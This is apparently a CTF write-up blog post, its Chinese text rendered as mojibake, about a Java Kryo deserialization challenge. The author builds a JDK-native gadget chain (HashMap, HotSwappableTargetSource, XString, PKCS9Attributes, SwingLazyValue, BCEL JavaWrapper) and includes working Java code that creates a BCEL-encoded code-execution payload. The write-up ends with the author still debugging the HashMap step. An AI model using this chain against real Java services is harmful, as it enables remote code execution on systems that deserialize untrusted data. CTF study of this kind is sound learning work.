---
layout: post
title: è¥¿å—èµ›åŒºjava
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.compu
---



```java
ç‡•å­ï¼Œæˆ‘ç»ˆäºæ¥äº†ï¼Œtnndæ—©å°±çœ‹ä¸Šäº†è¿™é“é¢˜ï¼Œç„¶åå­¦kryoå¤ç°coffeeå‘ç°éœ€è¦RASPï¼Œç„¶åå­¦RASPï¼Œå­¦å®Œå­¦Hessianï¼Œç„¶åæ‰æ¶¦æ¥ğŸ¤¢ï¼Œè®©ç‡•å­ä¹…ç­‰äº†
```

1. æç¤ºï¼šHessianåŸç”ŸJDKåˆ©ç”¨
2. Kryoååºåˆ—åŒ–

## è€è§„çŸ©è‡ªå·± åˆ†æä¸€æ³¢

```java
kryo 4.0.2  kryoåºåˆ—åŒ–æ¡†æ¶ï¼Œéœ€è¦å¯¹åºåˆ—/ååºåˆ—åŒ–çš„ç±»è¿›è¡Œæ³¨å†Œï¼Œé«˜ç‰ˆæœ¬è¿˜éœ€æœ‰æ— å‚æ„é€ ï¼Œé»˜è®¤FieldSerializeåºåˆ—åŒ–æ–¹å¼
snakeyaml-1.26
asm-5.0.4
```

è¯´å¥½çš„hessianåŸç”ŸJDKï¼Œæ²¡hessianä¾èµ–å‘€ã€‚ã€‚ã€‚

å…ˆçœ‹ç»™å‡ºçš„ç±»ï¼Œå®è´¨æ€§å°±äºŒä¸ªç±»ï¼Œä¸€ä¸ªjavabeanã€ä¸€ä¸ªcontroller

```java
public class MessageController {
    @RequestMapping({"/"})
    @ResponseBody
    public Object message(String message) throws Exception {
        byte[] decodemsg;
        if (message == null) {
            decodemsg = Base64.getDecoder().decode("ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAHLyYj656nh3Rj89bSK7ufJrcoDAXRpbWVzdGFt8AnMwumxjGIBAWNvbS5zZWEuVXNl8gEBMbABc2VhY2xvdWTz");
        } else {
            try {
                decodemsg = Base64.getDecoder().decode(message);
            } catch (Exception e) {
                decodemsg = Base64.getDecoder().decode("ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAGBw5uOyvHs1sGsg/nqhOyP9pIDAXRpbWVzdGFt8AnmifmxjGIBAWNvbS5zZWEuVXNl8gEBMbABZXJyb/I=");
            }
        }
        return new CodecMessageConverter(new MessageCodec()).toMessage(decodemsg, null).getPayload();
    }
}
```

ç»™çš„ä¹±ä¸ƒå…«ç³Ÿçš„ï¼Œäººå®¶ä¸éƒ½æ˜¯ç›´æ¥ç»™ååºåˆ—åŒ–ğŸï¼Œè¿™é‡Œå‘ƒå‘ƒå‘ƒï¼ˆéº»çƒ¦çš„æ˜¯ä¸€ä¸ªæ¥å£å¥—ä¸€ä¸ªæ¥å£ï¼‰

`ä½†ä¸æ˜¯æ‰€æœ‰javaé¢˜éƒ½æ˜¯è€ƒé“¾å­çš„ï¼ï¼ï¼`

![image-20231123200706815](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123200706815.png)

codecæ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„new MessageCodec()ï¼Œè¿™é‡Œ this.codec.decode(å­—èŠ‚ç ï¼Œobjectç±»)

![image-20231123201114783](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201114783.png)

![image-20231123201222356](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201222356.png)

ç„¶åç»§ç»­è·Ÿè¿›decodeä¸­

![image-20231123201248345](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201248345.png)

![image-20231123201255921](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201255921.png)

è‡ªå·±è·Ÿè¿›å»æ‰¾åˆ°çš„ï¼Œåº”è¯¥ä¸æ˜¯å·§åˆå­ï¼Œå¦‚æœæ˜¯å·§åˆæˆ‘çœŸçš„######äº†

ä¸Šé¢å…¶å®ä¸ç”¨è°ƒè¯•ï¼Œè‚¯å®šæ˜¯ç›´æ¥åˆ°readobjectäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾é“¾å­äº†ï¼š

æ–¯å¥½tmç†Ÿæ‚‰å•Šï¼Œè¿™é‡Œhashmapæ— ç–‘äº†ï¼Œä¸Šä¸€é“é¢˜ç”¨çš„æ˜¯rome+signObjectäºŒæ¬¡ååºåˆ—åŒ–æå¾—ï¼Œå¯æ˜¯è¿™é“é¢˜æ²¡æœ‰romeä¾èµ–éš¾æ

![image-20231123201601071](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123201601071.png)

### æ–¯çœ‹äº†çœ‹è¿™å‡ å¤©çš„ç¬”è®°ï¼Œä»¥åŠDubboé‚£ä¸ªCVE

```java
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
write:270, MapSerializer (com.alibaba.fastjson.serializer)
write:44, MapSerializer (com.alibaba.fastjson.serializer)
write:280, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:863, JSON (com.alibaba.fastjson)
toString:857, JSON (com.alibaba.fastjson)
    //ä¸Šé¢æ˜¯éœ€è¦fastjsonä¾èµ–çš„
    
    //ä¸‹é¢æ˜¯æˆ‘æœ‰çš„é“¾å­
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

æ‰€ä»¥æˆ‘ä»¬å½“å‰çš„é—®é¢˜å°±æ˜¯å¦‚ä½•æ‰¾åˆ°æŸä¸€ä¸ªç±»çš„#toStringæ–¹æ³•ç„¶åå‘½ä»¤æ‰§è¡Œ

æ—¢ç„¶æåˆ°äº†hessianåŸç”Ÿjdkè€Œæ²¡æœ‰ä¾èµ–ï¼Œå…«æˆæ˜¯ç”¨åˆ°äº†å…¶ä¸­çš„é“¾å­ï¼Œæˆ‘åœ¨è°ƒè¯•hessiané“¾å­çš„æ—¶å€™ä¹Ÿå‘ç°å¾ˆå¤šç±»ä¸éœ€è¦ç¬¬ä¸‰æ–¹åº“çš„ä¾èµ–

(`hessian`ä¸“æœ‰çš„åŒ…æ˜¯com.cachoï¼ŒtoStringæˆ‘çš„å¤©ç›´æ¥æ¬è¿)

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)

valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

è¿›è¡Œæ‹¼æ¥ä¸€ä¸‹

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)
 
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

æœç„¶æ˜¯è¿™æ ·å¥½å®Œ

![image-20231123205017944](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123205017944.png)

```java
æ€è€ƒäº†ä¸€ä¸ªä¸œè¥¿ï¼šä¸Šæ¬¡å› ä¸ºæ˜¯kryo5.2ç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹æ³¨å†Œç­‰ç­‰ï¼Œä½†è¿™é“é¢˜æ˜¯4.2ç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯falseæ‰€ä»¥ä¸éœ€è¦æ›´æ”¹ï¼Œæƒ³äº†åŠå¤©å’‹ç»•è¿‡çº¯è„‘ç˜«ğŸ˜¡ğŸ˜¡ğŸ˜¡ğŸ˜¡
```

å°±æ˜¯æ„é€ é“¾å­

```java
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
    readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

#### HotSwappableTargetSource.java

```java
  public boolean equals(Object other) {
        return this == other || other instanceof HotSwappableTargetSource && this.target.equals(((HotSwappableTargetSource)other).target);
    }
//ç›®çš„å¾ˆæ˜ç¡®ï¼Œtargetä¸ºXstringï¼Œåå°„èµ‹å€¼å³å¯   ä½†æ˜¯ï¼ï¼ï¼
 other instanceof HotSwappableTargetSource å¿…é¡»ç¬¦åˆè¿™ä¸ªä¸ºtrueï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„equalså‘€
 otheréœ€è¦æ˜¯HotSwappableTargetSourceç±»å‹ï¼Œä¸‹é¢Xstring.equals()çš„å‚æ•°å°±æ˜¯otherçš„targetå±æ€§
```

å¼å¼å¼ä¸æ„§æ˜¯æˆ‘å“ˆå“ˆå“ˆå“ˆ

```java
package com.sea;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class payload {
    public static void main(String[] args) throws Exception {
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);

        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));

        setFieldValue(s,"attributes",uiDefaults);
        //sæ˜¯æœ€åçš„toString
        XString xstring=new XString("a");
//        xstring.equals(s);
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource("aa");
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource("aa");
        setFieldValue(hotSwappableTargetSource1,"target",xstring);
        setFieldValue(hotSwappableTargetSource2,"target",s);
        hotSwappableTargetSource1.equals(hotSwappableTargetSource2);
//        com.sun.org.apache.xpath.internal.objects.XString
//
//
//        equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

![image-20231123210904016](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123210904016.png)

æ¥ä¸‹æ¥åªéœ€è¦è®©hashmapè°ƒç”¨åˆ°å°±è¡Œäº†ï¼Œç„¶åååºåˆ—åŒ–è°ƒè¯•é€šå³å¯ï¼ˆ`å¯æ˜¯hashmapåˆåˆåˆå¿˜äº†é€»è¾‘äº†ï¼Œè¿™é‡Œå…ˆè¯•è¯•`)

```java
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            //pæ˜¯ä¸Šä¸€ä¸ªçš„hashï¼Œ
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
```

æ¯æ¬¡éƒ½è¢«å¡è¿™é‡Œæœå•¦ï¼Œï¼ˆè¿™æ¬¡ä¸€å®šè¦å†™ä¸€ä¸ªä¸€åŠ³æ°¸é€¸çš„è„šæœ¬ï¼‰

![image-20231123212032448](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123212032448.png)

â€‹	è¿™ä¸ªæŠ¥é”™ç»™æˆ‘å¹²è’™è”½äº†ï¼ˆå¥‡æ€ªçš„æ˜¯åºåˆ—åŒ–ç«Ÿç„¶å¯ä»¥å¼¹è®¡ç®—å™¨ï¼‰

![image-20231123214546203](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123214546203.png)





![image-20231123215152139](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231123215152139.png)

key  

```java
   HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa","2");
        map1.put("bB","1");
        map2.put("aa","1");
        map2.put("bB","2");
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");


```

```java
å¥½å¥½å¥½ï¼Œæ²¡æƒ³åˆ°å¡åœ¨è¿™ä¸€æ­¥æœäº† æ˜å¤©æå®šä½ tnndï¼Œå†å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬
```

#### hashmap#readobjectè¿›è¡Œåˆ†æ

æ‰§è¡Œkey.equals(k)çš„å‰ç½®æ¡ä»¶æ˜¯ï¼Œp.hash==hashï¼Œhashå°±æ˜¯è®¡ç®—keyé”®å€¼çš„hashcodeå€¼ï¼Œå¦‚æœkeyçš„å¯¹è±¡é‡å†™äº†hashcodeå°±ä¼šæ‰§è¡Œé‡å†™çš„å¦åˆ™å°±æ˜¯æ™®é€šçš„hashcodeï¼Œç„¶åå°±ä¼šæ‰§è¡Œequalsæ–¹æ³•ï¼Œä¹Ÿæ˜¯ å½“å‰key .equals(ä¸Šä¸€ä¸ªkey)

![image-20231124142424406](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231124142424406.png)

è¿˜æ˜¯è¿™ä¸ªæŠ¥é”™æˆ‘å°±ä¸ç†è§£äº†å‘€

![image-20231124143533163](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231124143533163.png)









